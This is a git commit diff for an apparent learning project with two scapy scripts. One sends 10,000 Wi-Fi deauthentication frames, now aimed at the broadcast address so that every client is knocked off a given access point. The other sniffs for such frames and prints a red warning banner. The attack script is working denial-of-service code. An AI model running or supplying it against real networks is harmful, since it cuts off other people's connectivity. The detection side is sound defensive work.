b11366935ef4a6d5f0ce13cbc59d33534a68d32d
sergey <sergeyr1991@gmail.com>
2020-09-21 15:27:14 +0300

    fix defence output

--- deAuth_attack.py
+++ deAuth_attack.py
@@ -4,5 +4,5 @@ from scapy.all import *
 
 
 # Manually deauth packet send
-pkt = RadioTap() / Dot11(addr1 = "80:a5:89:09:d5:c5", addr2 = "98:1E:19:7B:4D:8E", addr3="98:1E:19:7B:4D:8E") / Dot11Deauth()
+pkt = RadioTap() / Dot11(addr1 = "ff:ff:ff:ff:ff:ff", addr2 = "98:1E:19:7B:4D:8E") / Dot11Deauth()
 sendp(pkt, iface="wlp0s20f0u1", count=10000, inter=.2)
--- deAuth_defence.py
+++ deAuth_defence.py
@@ -5,8 +5,15 @@ from scapy.layers.dot11 import Dot11, RadioTap, Dot11Deauth
 # Sniffing for deauth pkts with monitor mode
 def PacketHandler( pkt ):
     if pkt.haslayer(Dot11) and pkt.type == 0 and pkt.subtype == 0xC:
-        print("deAuth packet sniffed!!")
+        print("deAuth packet sniffed: " + pkt.summary())
 
-sniff(iface="wlp0s20f0u1", prn = PacketHandler)
+sniff(iface="wlp0s20f0u1", prn = PacketHandler, count = 50)
+print("         \033[91m======================================")
+print("         \033[91m======================================")
+
+print("         \033[91m==  YOUR ROUTER IS UNDER ATTACK!!!  ==")
+print("         \033[91m======================================")
+print("         \033[91m======================================")
+
 
 
